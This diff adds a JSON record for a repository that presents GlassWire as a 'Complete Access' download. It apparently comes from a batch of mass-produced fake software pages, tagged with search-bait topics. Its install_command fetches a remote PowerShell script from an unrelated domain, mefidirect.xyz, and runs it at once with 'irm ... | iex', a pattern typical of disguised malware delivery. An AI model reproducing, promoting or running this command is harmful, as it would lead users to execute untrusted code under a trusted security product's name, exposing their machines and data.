@@ -1,0 +1,26 @@
+{
+  "repo": "glasswire-complete-access",
+  "product": "GlassWire Complete Access",
+  "kind": "security",
+  "install_type": "download",
+  "download_url": "https://glasswire.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "security",
+  "topics": [
+    "glasswire-workspace",
+    "glasswire-setup",
+    "software-hub",
+    "glasswire-guide",
+    "glasswire-download-page",
+    "glasswire-win64",
+    "how-to-install-glasswire",
+    "app-catalog",
+    "release-notes",
+    "security-suite",
+    "endpoint-protection",
+    "threat-scanner"
+  ]
+}
